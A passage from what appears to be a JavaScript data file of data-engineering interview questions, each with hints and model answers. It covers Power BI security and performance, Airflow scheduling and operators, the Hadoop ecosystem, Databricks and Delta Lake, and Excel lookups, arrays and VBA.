      { q:'How do you implement row-level security in Power BI?', hint:'RLS: define roles with DAX filter on tables. Static: filter by fixed value. Dynamic: USERNAME()/USERPRINCIPALNAME() matches user table. Assign members to roles in Service. OLS for column security.', answer:`Row-Level Security in Power BI restricts which rows each user sees. Define roles in Power BI Desktop under Modeling > Manage Roles. A role contains DAX filter expressions on tables: for static RLS, [Region] = "East" limits the role to Eastern data. For dynamic RLS, [Email] = USERPRINCIPALNAME() filters rows where the Email column matches the logged-in user - combined with a security table, one role serves all users: a Manager table has (ManagerEmail, AllowedRegion) and DAX checks [Region] IN VALUES(ManagerTable[AllowedRegion]) filtered by USERPRINCIPALNAME(). Publish the report to the Service, then assign Active Directory users or groups to roles under the dataset security settings. Test with "Test as role" in Desktop and "View as" in the Service. Object-Level Security (OLS) hides specific tables or columns from roles - useful for hiding sensitive columns (salary, PII) from certain roles while still including the table for relationships. RLS applies to both Import and DirectQuery models.` },
      { q:'How do you optimise Power BI report performance?', hint:'Reduce model size: remove unused columns, aggregations. DirectQuery: limit visuals, avoid complex measures. VertiPaq Analyzer: column cardinality. Incremental refresh. Aggregations. Composite models. Avoid bidirectional relationships.', answer:`Power BI performance optimisation targets model size and DAX measure complexity. Model size: remove unused columns and tables - every column in the VertiPaq engine has a cardinality cost. High-cardinality text columns (free-form descriptions, GUIDs) compress poorly and consume memory. Aggregate numeric columns with high precision to lower decimal places. Use integer keys for relationships instead of text strings. VertiPaq Analyzer (SSAS Performance Tools) shows column-level memory usage and cardinality - identify the largest columns and evaluate whether they are needed. Incremental refresh loads only recent data on each refresh, dramatically reducing refresh time for large historical datasets. Aggregation tables pre-compute group-by results - queries that match the aggregation grain hit the in-memory aggregation rather than the detail rows. Composite models combine Import (for aggregated data) and DirectQuery (for drillthrough to detail) in one model. DAX optimisation: use variables (VAR) to avoid repeating expensive sub-expressions; use SUMX only when necessary (SUMX iterates row by row, SUM does not); avoid FILTER in iterator contexts.` },
      { q:'How do you use Power BI for enterprise reporting and governance?', hint:'Workspaces: dev/test/prod pipeline. Endorsement: promoted, certified. Sensitivity labels. Admin portal: tenant settings. Deployment pipelines. Lineage view. Usage metrics. Azure Purview integration.', answer:`Enterprise Power BI governance requires structured content management. Workspaces organise content by team or domain with role-based access (Admin, Member, Contributor, Viewer). Deployment Pipelines provide dev/test/prod promotion: content is developed in the Development workspace, validated in Test, then promoted to Production - each stage has its own workspace and data source connections can be parameterised. Endorsement signals content quality: Promoted (creator's recommendation), Certified (IT or data governance team verified) - Certified datasets appear first in search and are recommended for reuse. Sensitivity labels from Microsoft Information Protection apply to datasets and reports, flowing to Excel exports and downstream uses. The Admin Portal controls tenant-wide settings: who can publish to web, who can export data, whether guest users can access content. Lineage view shows data source to dataflow to dataset to report to dashboard connections - critical for impact analysis before changing a data source. Usage Metrics reports show which reports are used, by whom, and how frequently - informing decisions about which reports to maintain or retire.` },
      { q:'How do you connect Power BI to real-time data?', hint:'Push datasets: REST API. Streaming datasets: API or Azure Stream Analytics. Auto page refresh: DirectQuery only, minimum interval. Real-time dashboard tiles from streaming. PubNub streaming data. Limitations vs batch.', answer:`Power BI supports three patterns for real-time data. Push datasets: a REST API endpoint receives POST requests with JSON data rows, updating the dataset in real time - Power BI dashboard tiles and reports refresh automatically. The API supports up to 5 tables per dataset and 1 million rows retained (older rows drop). Streaming datasets are lighter-weight, designed for high-frequency telemetry - no historical data stored, only the current value is shown in dashboard tiles. Azure Stream Analytics integrates natively, outputting processed stream results to a Power BI streaming dataset without custom API calls. Auto page refresh (DirectQuery mode only): reports automatically re-query the source on a configured interval (minimum 1 second on Premium, 30 minutes on Shared capacity) - useful for near-real-time operational dashboards. Limitations: real-time Power BI is not suitable for sub-second latency or complex interactive analysis - it is adequate for operational dashboards showing current system status. For complex real-time analytics, purpose-built tools (Grafana, Kibana, Azure Data Explorer) outperform Power BI.` },
    ],
    airflow: [
      { q:'Explain the Apache Airflow architecture and its core components.', hint:'DAG: directed acyclic graph of tasks. Scheduler: triggers task runs. Executor: runs tasks (LocalExecutor, CeleryExecutor, KubernetesExecutor). Workers. Metadata DB (Postgres/MySQL). Webserver UI. XCom for inter-task data.', answer:`Airflow is a platform for programmatically authoring, scheduling, and monitoring data pipelines. Core components: the Scheduler reads DAG definitions, checks schedule intervals and dependencies, and submits ready tasks to the Executor. The Executor determines how tasks run: LocalExecutor runs tasks as subprocesses on the scheduler machine (single-node); CeleryExecutor distributes tasks to Celery worker nodes for scale; KubernetesExecutor launches a fresh Kubernetes pod per task for isolation and resource efficiency. The Webserver provides the UI - DAG graph view, task logs, execution history. The Metadata Database (PostgreSQL recommended for production) stores DAG definitions, task states, XCom values, and execution history. XCom (cross-communication) allows tasks to share small data values - task A pushes a value, task B pulls it. For large data, I never use XCom for DataFrames or large payloads - use object storage (S3) and pass the path. Airflow DAGs are Python files defining Tasks and their dependencies - this "pipelines as code" approach enables version control, code review, and testing of pipeline logic.` },
      { q:'How do you define and schedule Airflow DAGs? Explain the scheduling model.', hint:'DAG: schedule_interval (cron or timedelta). start_date: backfill trigger. catchup=False to prevent backfill. execution_date vs data interval. Logical date concept. @daily/@hourly shortcuts. Dynamic DAGs.', answer:`An Airflow DAG is defined in Python: with DAG("my_pipeline", schedule_interval="0 6 * * *", start_date=datetime(2025,1,1), catchup=False) as dag: defines a DAG running at 6 AM daily. schedule_interval accepts cron syntax, timedelta, or presets (@daily, @hourly, @weekly). The execution_date (now called "logical date") represents the data interval being processed, not when the task runs - a daily DAG scheduled at 6 AM with execution_date 2025-01-15 processes data from Jan 15 and runs at 6 AM Jan 16. This offset-by-one-interval model is confusing but allows the interval to complete before processing it. catchup=True (default) causes Airflow to backfill all missed DAG runs since start_date - always set catchup=False for production DAGs unless you explicitly need backfill. Dynamic DAGs generate tasks programmatically: a for loop creates one task per table in a list. I generate DAG files or use a factory function that reads configuration from a YAML file, enabling non-engineers to add new pipeline instances without editing Python.` },
      { q:'How do you handle task dependencies and data flow in Airflow?', hint:'Bitshift operators: >> and <<. set_upstream/downstream. BranchPythonOperator for conditional paths. TriggerRule: all_success, all_done, one_success. XCom for small data. TaskGroup for visual organisation.', answer:`Task dependencies are defined with Python operators: extract >> transform >> load sets a linear chain. For parallel execution: [extract_users, extract_orders] >> transform creates a fan-in. Branching: BranchPythonOperator calls a Python function that returns the task_id(s) of the next task to execute - all non-selected downstream tasks are skipped. TriggerRules control when a task runs based on upstream states: all_success (default - only run if all upstreams succeeded), all_done (run regardless of upstream success/failure, useful for cleanup tasks), one_failed (run if any upstream fails, for alerting). XCom passes small values between tasks: in Operator execute(), return a value or call self.xcom_push; downstream tasks use context['ti'].xcom_pull(task_ids='extract_task'). For DataFrame-level data passing, I write to S3 in task A and read from S3 in task B, passing only the S3 path via XCom. TaskGroups visually group related tasks in the UI without changing dependency logic - useful for showing the three steps of each table's processing as one collapsed group.` },
      { q:'What are Airflow Operators and how do you choose between them?', hint:'PythonOperator: arbitrary Python. BashOperator: shell commands. SparkSubmitOperator, BigQueryOperator, PostgresOperator for integrations. KubernetesPodOperator: any Docker image. TaskFlow API (@task decorator). Provider packages.', answer:`Operators define what a task does. PythonOperator calls any Python callable - the workhorse for custom logic. BashOperator executes shell commands. KubernetesPodOperator launches a Docker container on Kubernetes - enables any language or binary without Airflow worker dependencies. The TaskFlow API (@task decorator) is the modern approach - it wraps Python functions as tasks and handles XCom automatically: @task def extract(): return data; @task def transform(data): return result - data passes between tasks via XCom transparently. Provider packages extend Airflow with integration operators: apache-airflow-providers-amazon for S3Operator, GCSToS3Operator; apache-airflow-providers-google for BigQueryOperator, DataflowOperator; apache-airflow-providers-apache-spark for SparkSubmitOperator. Sensors are special operators that wait for a condition: S3KeySensor waits for a file to appear, ExternalTaskSensor waits for another DAG task to complete. I choose KubernetesPodOperator for heavy workloads (Spark jobs, ML training) to isolate dependencies and resource usage from the Airflow workers.` },
      { q:'How do you test and deploy Airflow DAGs in production?', hint:'Unit test: DAG import, task count, no cycles. pytest-airflow or direct assertions. Staging environment. CI/CD: lint with pylint/flake8, DAG validation in pipeline. GitOps deployment. Variables and Connections as env vars or Secrets backend.', answer:`Airflow testing starts with DAG validation: assert the DAG imports without error, has the expected number of tasks, and contains no cycles - these catch the most common mistakes. pytest test: load the DAG file, check dag.task_count == expected_count and no circular dependencies. For task logic testing, I factor business logic into pure Python functions (no Airflow imports) and unit test them independently - this is easier than testing inside Airflow operators. Integration testing in a staging Airflow environment using production-like data samples catches operator configuration errors. CI/CD pipeline: flake8/pylint lints DAG files, pytest validates DAG structure, then DAGs are deployed to staging via rsync to the DAGs folder or a Git-sync sidecar (Airflow reads DAGs from a Git repository via an operator that continuously syncs). Variables and Connections (database credentials, API keys) are never hardcoded - use Airflow Variables (UI or environment variables AIRFLOW_VAR_*) and Connections (AIRFLOW_CONN_*), or integrate with a secrets backend (HashiCorp Vault, AWS Secrets Manager).` },
      { q:'How do you handle failures and retries in Airflow?', hint:'retries: 3. retry_delay: timedelta. on_failure_callback: alerting. SLA miss callbacks. email_on_failure. Dead-letter DAGs. Catchup and backfill for reruns. Task clearing. Monitoring: task state distribution.', answer:`Airflow task failure handling: set retries=3 and retry_delay=timedelta(minutes=5) at the DAG level or per task - this automatically retries transient failures (network blips, API rate limits). retry_exponential_backoff=True implements exponential back-off between retries. on_failure_callback is a Python function called when a task fails after all retries - I use this to send Slack or PagerDuty alerts with the DAG name, task ID, execution date, and log URL. email_on_failure sends failure emails automatically. SLA misses: set task sla=timedelta(hours=2) to alert if the task does not complete within 2 hours of the DAG start. For failed runs requiring reprocessing: Clear Task State in the UI marks selected task instances for re-run on the next scheduler cycle; backfill from CLI re-runs a specific date range: airflow dags backfill --start-date 2025-01-01 --end-date 2025-01-07 my_dag. For monitoring, I track the ratio of success/failed/skipped task states over time - increasing failure rates without code changes indicate upstream data quality issues.` },
      { q:'How do you scale Airflow for production workloads?', hint:'CeleryExecutor: Redis/RabbitMQ queue, multiple workers. KubernetesExecutor: pod per task. Separate scheduler, webserver, worker instances. DAG serialisation: DB-stored DAGs. Flower for Celery monitoring. Resource pools. Priority weights.', answer:`Production Airflow scaling choices: CeleryExecutor uses a message broker (Redis or RabbitMQ) to distribute tasks to multiple statically provisioned worker nodes - easy to set up, good for predictable workloads. KubernetesExecutor launches a fresh pod per task on Kubernetes - perfect isolation, scales to zero when idle, but pod startup latency (30-60 seconds) is unsuitable for tasks that need fast startup. CeleryKubernetesExecutor runs KubernetesExecutor tasks alongside CeleryExecutor tasks - use Kubernetes for heavy isolated tasks and Celery for lightweight frequent tasks. Separate the Scheduler, Webserver, and Workers onto different nodes for fault isolation. DAG serialisation: store DAG definitions in the metadata database rather than sharing a filesystem - removes the need for a shared NFS mount for DAGs folder. Pools limit concurrent task execution for external resource protection: a database pool with 10 slots ensures no more than 10 tasks simultaneously query the production database. Priority weights determine which tasks are scheduled first when the pool is full. For high-availability schedulers, Airflow 2.0+ supports running two schedulers simultaneously for failover.` },
    ],
    hadoop: [
      { q:'Explain the Hadoop ecosystem architecture: HDFS, YARN, and MapReduce.', hint:'HDFS: distributed file system, NameNode + DataNodes, block replication (3x). YARN: resource manager + node managers, application master. MapReduce: map (key-value) + shuffle/sort + reduce. Batch processing paradigm.', answer:`Hadoop is a framework for distributed storage and processing of large datasets. HDFS (Hadoop Distributed File System): files are split into 128MB blocks, each replicated 3x across DataNodes for fault tolerance. NameNode is the master node storing metadata (block locations, file namespace) - its failure is the original single point of failure (addressed with HA NameNode using ZooKeeper). DataNodes store the actual blocks and report to the NameNode. YARN (Yet Another Resource Negotiator) is the cluster resource manager: ResourceManager allocates CPU and memory globally; NodeManagers on each worker report available resources and manage container lifecycle; ApplicationMaster (one per job) negotiates resources with ResourceManager and coordinates task execution. MapReduce is the original Hadoop computation model: the Map phase reads HDFS blocks and emits key-value pairs; the shuffle phase sorts and groups by key across the cluster; the Reduce phase aggregates grouped values. MapReduce is batch-only, written to disk between phases, and relatively slow - it has been largely superseded by Spark for processing, while HDFS and YARN remain the foundation.` },
      { q:'How does HDFS handle fault tolerance and data reliability?', hint:'Block replication (default 3x). Rack awareness: replicas across racks. Heartbeat from DataNodes. Block report. NameNode HA with standby. Checkpoint Node. Erasure coding for cold storage.', answer:`HDFS replicates each block three times by default - the first replica on a local node, the second on a different rack, the third on another node in the second rack (rack-aware placement). This tolerates both DataNode failures and complete rack failures. DataNodes send heartbeats to the NameNode every 3 seconds; missing heartbeats trigger the NameNode to initiate re-replication of blocks from the failed node. Block reports sent periodically verify the NameNode metadata matches actual block locations. NameNode HA: in older Hadoop, NameNode was a single point of failure. The HA configuration runs two NameNodes (Active + Standby), sharing edit logs via JournalNodes (quorum-based shared log service). ZooKeeper handles automatic failover when the Active NameNode fails. Erasure Coding (Hadoop 3.0+): for cold data where replication overhead is too expensive, EC stores parity information across a stripe of blocks, tolerating failures with 50% storage overhead instead of 200% from 3x replication - appropriate for archival data.` },
      { q:'What is the Hadoop ecosystem beyond core HDFS/YARN? Name key components and their roles.', hint:'Hive: SQL on Hadoop (HQL). Pig: dataflow scripting. HBase: NoSQL on HDFS. Sqoop: RDBMS import/export. Flume: log collection. Oozie: workflow scheduler. Zookeeper: coordination. Impala: fast interactive SQL. Hue: web UI.', answer:`The Hadoop ecosystem grew as community tools addressed gaps in the core framework. Apache Hive translates HiveQL (SQL-like queries) to MapReduce/Tez/Spark jobs - the primary SQL interface to HDFS data warehouses. Hive Metastore is the shared table schema registry used by Spark, Presto, and Impala. HBase is a column-family NoSQL database built on HDFS, providing low-latency random read/write access to billions of rows - used where you need real-time lookups against large datasets (e.g., user profile lookups). Apache Sqoop imports data from relational databases (MySQL, Oracle) to HDFS and exports back - critical for the RDBMS-to-HDFS ETL path. Apache Flume collects, aggregates, and streams log data from many sources to HDFS in real time. Apache Oozie schedules and coordinates multi-step Hadoop workflows (largely replaced by Airflow in modern stacks). Apache ZooKeeper provides distributed coordination services (leader election, configuration management, locks) - required by HBase, Kafka, and HDFS HA. Apache Impala provides interactive SQL queries directly on HDFS data without MapReduce overhead - much faster than Hive for ad-hoc queries.` },
      { q:'How has Hadoop evolved? Compare it to modern alternatives like Spark and cloud data warehouses.', hint:'Hadoop limitations: disk-based MapReduce, slow iteration. Spark: in-memory, 100x faster. Cloud DW: Snowflake, BigQuery, Redshift - serverless, no ops. Hadoop still relevant for: existing HDFS investments, HBase, on-prem cost.', answer:`Hadoop MapReduce was transformative in 2006 but has significant limitations by modern standards. MapReduce writes intermediate results to disk between every phase - iterative algorithms (machine learning, graph processing) require dozens of disk reads and writes, making them extremely slow. Hadoop requires significant operational expertise: cluster management, capacity planning, version compatibility across the ecosystem. Apache Spark replaced MapReduce as the processing engine: in-memory processing is 10-100x faster, and the DataFrame/Dataset API is far more expressive than Map and Reduce. Many organisations use YARN for resource management while running Spark jobs, keeping HDFS for storage. Cloud-native data warehouses (Snowflake, BigQuery, Redshift, Databricks Lakehouse) have largely replaced on-premises Hadoop for new greenfield deployments: no infrastructure management, separation of compute and storage, SQL-first interface, and pay-per-use pricing. Hadoop remains relevant for: organisations with large existing HDFS investments and on-premises infrastructure, workloads with extreme data locality requirements, and HBase for low-latency random-access workloads without a managed cloud alternative. The modern recommendation for new projects is a cloud lakehouse (Delta Lake on S3 with Spark via Databricks, or a managed cloud DW) rather than on-premises Hadoop.` },
      { q:'How do you write and optimise Hive queries?', hint:'Partitioning: reduces data scanned. Bucketing: even distribution for joins. ORC/Parquet formats: columnar, compressed. Tez execution engine. Vectorised query execution. Stats: ANALYSE TABLE. Avoid SELECT *.', answer:`Hive query optimisation starts with data organisation. Partitioning on frequently filtered columns (date, region) physically organises data so queries with WHERE clauses scan only relevant partitions: CREATE TABLE logs PARTITIONED BY (dt STRING). Never select all partitions without a filter on the partition column. Bucketing distributes data into a fixed number of files based on a hash of a column: CLUSTERED BY user_id INTO 256 BUCKETS enables efficient sampling and optimised bucket-map joins. File format: always use ORC or Parquet for Hive tables - 5-10x smaller than text, with predicate pushdown that avoids reading column data the query does not need. Enable vectorised execution: SET hive.vectorized.execution.enabled=true processes data in 1024-row batches using CPU SIMD instructions. Tez execution engine (default in modern Hive) replaces MapReduce with a DAG model, eliminating intermediate disk writes for multi-stage queries. ANALYSE TABLE generates statistics that the query planner uses for join ordering and cost estimation - run after large data loads. Join optimisation: smaller table on the right side for map joins; use MAPJOIN hint for broadcasting small tables.` },
      { q:'How do you ingest data into Hadoop from various sources?', hint:'Sqoop: batch RDBMS import (JDBC). Flume: streaming log collection. Kafka + Kafka Connect: event streaming. NFS gateway: filesystem access. Distcp: HDFS-to-HDFS bulk copy. REST APIs: custom MapReduce or Spark jobs.', answer:`Hadoop data ingestion methods depend on the source type and latency requirements. Sqoop handles batch ingestion from relational databases: sqoop import --connect jdbc:mysql://db/prod --table orders --target-dir /data/orders --incremental append --check-column id --last-value 100000 imports only new rows since the last run. Sqoop parallelises by splitting on the primary key and running multiple map tasks simultaneously. Flume collects log data from applications: a Flume agent has a Source (tail log files, listen on syslog UDP/TCP), Channel (in-memory or file-based buffer), and Sink (HDFS, Kafka). Kafka Connect is the modern alternative to Flume for streaming ingestion: a JDBC Source Connector pulls from databases with CDC, File Source pulls from files. DistCp (Distributed Copy) is the tool for bulk HDFS-to-HDFS transfers across clusters: hadoop distcp hdfs://source-cluster/data hdfs://dest-cluster/data runs as a MapReduce job with parallelism. For REST API sources without a connector, a Spark job with periodic scheduling (Airflow) handles paginated API extraction and writes to HDFS as Parquet.` },
    ],
    databricks: [
      { q:'What is Databricks and how does it relate to Apache Spark?', hint:'Databricks: commercial platform built on Spark. Managed clusters. Collaborative notebooks. Delta Lake native. Unity Catalog. MLflow integrated. Photon engine. Job scheduler. REST API and CLI.', answer:`Databricks is a cloud data platform founded by the creators of Apache Spark, built on top of open-source Spark and Delta Lake. It provides a managed environment eliminating Spark cluster operations - cluster provisioning, auto-scaling, and version management are handled by the platform. Collaborative notebooks (Python, Scala, SQL, R) with real-time co-editing support data engineering, data science, and SQL analytics in one workspace. Delta Lake is the native table format, providing ACID transactions, time travel, and schema enforcement on cloud object storage. Unity Catalog is the centralised governance layer across all workspaces - table permissions, lineage, and data discovery in one place. Photon is the native vectorised query engine written in C++ that accelerates SQL and DataFrame operations 2-12x over standard Spark. MLflow is integrated for experiment tracking, model registry, and model serving. The Jobs interface schedules notebooks and JAR/wheel jobs with retry logic and alerting. Databricks abstracts Spark's operational complexity while exposing its full power, making it the dominant enterprise Spark platform.` },
      { q:'How does Delta Lake work and what problems does it solve?', hint:'ACID on object storage. Transaction log: _delta_log. Time travel. Schema enforcement + evolution. MERGE INTO (upsert). Optimize + Z-Order. Vacuum. Unity Catalog tables.', answer:`Delta Lake solves the fundamental problem of running reliable data pipelines on cloud object storage (S3, ADLS, GCS) - which is not inherently ACID-compliant. The transaction log (_delta_log directory) is the core mechanism: every write operation creates a JSON commit file recording exactly what changed. Readers see a consistent snapshot without locks, and concurrent writers are serialised via optimistic concurrency. Problems solved: previously writing to S3 with Spark was "eventually consistent" - concurrent readers could see partial writes. Delta guarantees atomicity (all or nothing), consistency (schema enforcement), isolation (concurrent reads see stable snapshots), and durability (committed data is never lost). MERGE INTO enables CDC upsert patterns: MERGE INTO target USING source ON target.id = source.id WHEN MATCHED THEN UPDATE ... WHEN NOT MATCHED THEN INSERT. Time travel enables audit queries and rollbacks. Schema enforcement rejects writes with incompatible columns; schema evolution (mergeSchema) accepts additive changes. OPTIMIZE compacts small files from streaming writes into larger Parquet files. VACUUM removes old snapshots beyond the retention period. Z-ORDER co-locates related rows for efficient multi-column filter queries.` },
      { q:'How do you use Databricks for machine learning workflows?', hint:'MLflow: experiment tracking, model registry. AutoML. Feature Store. Model serving: real-time REST endpoints. Databricks Runtime ML: pre-installed libraries. Hyperopt for distributed hyperparameter tuning.', answer:`Databricks ML workflow: Feature engineering in Delta tables provides reproducible, versioned training data. Databricks Feature Store registers features with metadata and ensures training/serving consistency - the same feature computation runs in batch (for training) and real-time (for serving). MLflow Tracking logs every experiment: parameters (learning_rate, n_estimators), metrics (accuracy, RMSE per epoch), and artefacts (model files, confusion matrices). Runs are organised in experiments for comparison. MLflow Model Registry manages the model lifecycle: Register a run's model, transition through Staging and Production stages with approval gates. Hyperopt with SparkTrials distributes hyperparameter search across the cluster - each trial runs on a separate worker, parallelising what would otherwise be sequential grid search. Databricks AutoML generates a baseline notebook with feature engineering and model comparison automatically - a good starting point that trains multiple algorithms and produces a leaderboard. Model serving: registered models are deployed to serverless REST endpoints with autoscaling and monitoring. Databricks Runtime ML includes scikit-learn, TensorFlow, PyTorch, XGBoost pre-installed with optimised versions.` },
      { q:'How do you structure Databricks projects for teams?', hint:'Repos: Git integration (GitHub/GitLab). Folder structure: notebooks, src/, tests/. dbx or Databricks Asset Bundles for CI/CD. Job clusters vs all-purpose clusters. Libraries: %pip install, cluster-scoped, init scripts.', answer:`Databricks Repos integrates with GitHub, GitLab, Bitbucket, or Azure DevOps - each workspace folder can sync with a Git repository branch. Developers work on feature branches, commit from the notebook editor or external IDE (VSCode with Databricks extension), and merge via pull requests. Project structure: notebooks/ for interactive analysis and SQL reports, src/ for production Python modules (packaged as wheels), tests/ for pytest unit and integration tests. Databricks Asset Bundles (the modern deployment tool replacing dbx) defines jobs, clusters, and permissions as YAML configuration with variable substitution per environment: databricks bundle deploy --target prod. Job clusters are ephemeral - they start for a job run and terminate on completion, costing less than all-purpose clusters running 24/7. Libraries: %pip install within a notebook installs in the notebook session; cluster libraries install for all users of the cluster; workspace libraries are managed centrally. Init scripts run on cluster start to install OS packages or configure environment variables. For large teams, I enforce cluster policies that restrict instance types and set maximum runtime to control costs.` },
      { q:'How do you optimise Databricks cluster costs?', hint:'Autoscaling: min/max workers. Spot instances: 70-90% cheaper. Auto-termination. Cluster pools: pre-warmed instances. Job clusters vs interactive. DBU pricing by instance type. Photon for SQL workloads.', answer:`Databricks cost optimisation combines cluster sizing, instance type selection, and lifecycle management. Autoscaling: set min=2 and max=20 workers - the cluster scales down during idle periods, significantly reducing cost for variable workloads. Always-on clusters idle at minimum workers; job clusters terminate entirely between runs. Auto-termination: interactive clusters should terminate after 30-60 minutes of inactivity - a forgotten running cluster costs money for no benefit. Spot instances (AWS Spot, Azure Spot, GCP Preemptible): 70-90% cheaper than on-demand for fault-tolerant workloads. Use spot for worker nodes; keep the driver on on-demand to avoid DAG recomputation on driver failure. Cluster pools maintain pre-warmed instances that satisfy cluster start requests in seconds rather than 3-5 minutes - reduces startup time without paying for a running cluster. Pool instances run at on-demand prices when reserved but save the startup delay. Photon engine accelerates SQL queries 2-12x - enabling a smaller cluster to process the same workload in the same time. Instance type selection: memory-optimised instances (r-series on AWS) for large Spark shuffles; compute-optimised (c-series) for CPU-intensive ML. Monitor the Ganglia metrics and cluster utilisation in Databricks UI to right-size clusters.` },
      { q:'How does Unity Catalog improve data governance in Databricks?', hint:'Three-level namespace: catalog.schema.table. Centralised permissions across workspaces. Column-level security. Row filters. Data lineage. Audit logs. External locations for cloud storage. Metastore: one per region.', answer:`Unity Catalog provides a unified governance layer across all Databricks workspaces in an organisation. The three-level namespace (catalog.schema.table) adds a catalog tier above the traditional database.table structure - catalogs can map to business domains (marketing.customer_data.purchases), environments (prod.finance.transactions), or data products. Permissions are centralised: GRANT SELECT ON TABLE prod.sales.orders TO GROUP analysts applies across all workspaces using that metastore - no per-workspace permission duplication. Column-level security: GRANT SELECT ON TABLE orders (order_id, order_date) TO GROUP analysts - the revenue column is withheld. Row filters apply DAX-like conditions per user group. Data lineage automatically tracks how tables are derived from other tables and which notebooks or jobs produced them - tracing a data quality issue back through the pipeline. Audit logs capture all data access and permission changes for compliance. External Locations define which cloud storage paths (S3 buckets, ADLS containers) are accessible and from which storage credentials, providing a single control plane for cloud storage access rather than per-cluster instance profiles.` },
    ],
    excel: [
      { q:'What are Excel pivot tables and how do you use them for data analysis?', hint:'Pivot table: interactive cross-tabulation. Drag fields: rows, columns, values, filters. Aggregations: SUM/COUNT/AVERAGE. Calculated fields. Refresh when data changes. Slicers for interactive filtering. Value field settings.', answer:`Pivot tables are Excel most powerful feature for summarising large datasets without writing formulas. Insert > PivotTable creates a table from a range or table. The Field List has four drop zones: Rows (categories going down), Columns (categories going across), Values (numbers to aggregate), and Filters (top-level filter applied to the entire pivot). Aggregation options in Value Field Settings: SUM for revenue, COUNT for transaction counts, AVERAGE for per-unit metrics, MAX/MIN for ranges. Show Values As options calculate percentage of row total, running total, and rank within the pivot. Calculated Fields add custom formulas based on pivot fields - a Profit Margin calculated field = Revenue / Cost without needing a column in the source data. Slicers provide clickable filter buttons for visually filtering pivot tables - more intuitive than the Filter drop zone for presentations. Timelines filter date fields interactively. Group Dates aggregates by month/quarter/year automatically. Always format source data as an Excel Table (Ctrl+T) so pivot tables auto-expand when new rows are added and Refresh updates correctly.` },
      { q:'Explain VLOOKUP vs INDEX/MATCH vs XLOOKUP. When do you use each?', hint:'VLOOKUP: looks right only, column number brittle. INDEX/MATCH: flexible direction, more robust. XLOOKUP (2019+): replaces both, cleaner syntax, looks left, multiple returns, not-found handling. Performance: XLOOKUP >= INDEX/MATCH > VLOOKUP.', answer:`VLOOKUP(lookup_value, table_array, col_index_num, [range_lookup]) has two critical limitations: it can only look to the right of the lookup column (the lookup column must be the leftmost column), and the column index number breaks when columns are inserted or reordered. INDEX/MATCH solves both: INDEX(return_range, MATCH(lookup_value, lookup_range, 0)) looks in any direction and references the return column by range rather than number - insert a column and nothing breaks. XLOOKUP (Excel 365 and 2019+) is the modern replacement: XLOOKUP(lookup_value, lookup_array, return_array, [if_not_found], [match_mode], [search_mode]). Benefits: looks left by default, the [if_not_found] argument replaces IFERROR wrapping, return_array can be a multi-column range returning multiple values, and it can search from last-to-first or with binary search for performance. I use XLOOKUP for all new work on supported Excel versions, INDEX/MATCH when cross-compatibility with Excel 2016/2013 is needed, and explain VLOOKUP only when maintaining legacy workbooks.` },
      { q:'How do you use Excel for data cleaning and transformation?', hint:'Text functions: TRIM, CLEAN, LEFT/RIGHT/MID, FIND/SEARCH, SUBSTITUTE. Flash Fill. Text to Columns. Remove Duplicates. Power Query: repeatable ETL. Date parsing. Data Validation.', answer:`Excel data cleaning combines formulas, tools, and Power Query. Text cleanup formulas: TRIM removes extra spaces (TRIM(" data ") = "data"), CLEAN removes non-printable characters from imported data, PROPER capitalises each word, UPPER/LOWER normalise case. Extracting parts: LEFT(text,n), RIGHT(text,n), MID(text,start,n), FIND(find_text,within_text) locates position for dynamic extraction. SUBSTITUTE replaces all occurrences: SUBSTITUTE(A1,"-","") removes all hyphens. Flash Fill (Ctrl+E) intelligently continues a pattern you start typing - extract first names, reformat phone numbers, combine name fields. Text to Columns splits delimited data or fixed-width fields. Remove Duplicates removes exact row duplicates. Power Query (Get & Transform) provides a GUI for repeatable ETL: connect to CSV/database/web, apply transformation steps (filter, split column, merge, pivot/unpivot), and load to a table - all steps are recorded and re-run automatically on refresh. Power Query is the right tool for data that needs the same cleaning steps repeatedly.` },
      { q:'What are Excel array formulas and dynamic arrays?', hint:'CTRL+SHIFT+ENTER (legacy). Dynamic arrays (365): spill range. FILTER, SORT, SORTBY, UNIQUE, SEQUENCE, XLOOKUP. # reference for spilled range. LET for readable formulas. LAMBDA for custom functions.', answer:`Legacy array formulas (entered with Ctrl+Shift+Enter) performed calculations across multiple cells - identifiable by the curly braces {} in the formula bar. They were powerful but confusing. Dynamic Arrays (Excel 365) replace them with a cleaner model: formulas that return multiple values automatically spill into adjacent cells. FILTER(array, include, [if_empty]) returns rows matching a condition: FILTER(A2:C100, B2:B100="Active") returns all active rows - the result spills into as many rows as there are active records. SORT(array, sort_index) and SORTBY(array, by_array) sort without needing a helper column. UNIQUE(array) extracts distinct values. SEQUENCE(rows, cols, start, step) generates number sequences - SEQUENCE(12) generates months 1-12. The spill range reference uses #: if FILTER starts in E2, E2# references the entire spill range regardless of its size. LET defines intermediate variables for readability: LET(revenue, SUM(B:B), cost, SUM(C:C), revenue-cost). LAMBDA creates custom reusable functions: LAMBDA(x, y, x^2 + y^2) defined in Name Manager and called like a built-in function.` },
      { q:'How do you automate Excel with macros and VBA?', hint:'Macro recorder: starts recording actions. VBA editor (Alt+F11). Sub procedures, functions. Loops: For/Next, For Each, Do While. Object model: Workbook, Worksheet, Range, Cell. Error handling: On Error Resume Next.', answer:`Excel macros automate repetitive tasks. Macro Recorder (View > Macros > Record Macro) captures your actions as VBA code - a fast way to generate code for unfamiliar tasks, though the recorded code is verbose. VBA Editor (Alt+F11) writes and edits procedures. Sub MySub() ... End Sub defines a macro; Function MyFunc(arg) ... End Function defines a callable function. Excel object model: Application (the Excel app), Workbook (a file), Worksheet (a sheet), Range ("A1:B10" or Cells(row,col)), Cell (single cell). Common patterns: iterate rows with For i = 2 To LastRow: Cells(i, 3).Value = Cells(i, 1).Value * Cells(i, 2).Value: Next i. For Each loop: For Each ws In Workbooks("Sales").Worksheets processes each sheet. With block reduces repetitive object references: With Range("A1:D100"): .Font.Bold = True: .Interior.Color = RGB(255,255,0): End With. Error handling: On Error GoTo ErrorHandler or On Error Resume Next for expected errors. For structured data processing, Power Query is often preferable to VBA - it is more maintainable and does not require macro security permissions.` },
